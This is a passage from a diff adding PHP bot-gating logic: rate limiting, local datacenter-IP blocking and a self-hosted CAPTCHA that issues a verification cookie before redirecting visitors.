+    gk_redirect(BLOCKED_REDIRECT_URL);
+}
+
+// 5. Request-flood throttling.
+if (RATE_LIMIT_ENABLED && gk_is_rate_limited($ip)) {
+    gk_redirect(BLOCKED_REDIRECT_URL);
+}
+
+// 6. Known datacenter/VPS IP — local list, no external call.
+if (gk_is_known_datacenter_ip($ip)) {
+    gk_redirect(BLOCKED_REDIRECT_URL);
+}
+
+// 7. Self-hosted CAPTCHA challenge.
+if (ENABLE_CAPTCHA && extension_loaded('gd')) {
+
+    if (gk_captcha_attempts_get($ip) >= CAPTCHA_MAX_ATTEMPTS) {
+        gk_redirect(BLOCKED_REDIRECT_URL);
+    }
+
+    if (isset($_POST['gk_submit'])) {
+        $submitted = strtoupper(trim($_POST['gk_code'] ?? ''));
+        $expected = $_SESSION['gk_captcha_code'] ?? null;
+
+        if ($expected && $submitted === $expected) {
+            unset($_SESSION['gk_captcha_code']);
+            gk_issue_verified_cookie($ip);
+            gk_redirect(SAFE_REDIRECT_URL);
+        } else {
+            gk_captcha_attempts_increment($ip);
+            unset($_SESSION['gk_captcha_code']); // force a fresh code
+            gk_render_challenge_page('Incorrect code — please try again.');
+        }
+    }
+
+    // No valid attempt yet: show a fresh challenge.
+    unset($_SESSION['gk_captcha_code']);
+    gk_render_challenge_page();
+}
+
+// CAPTCHA disabled or GD unavailable: fall through to safe redirect.
+gk_redirect(SAFE_REDIRECT_URL);
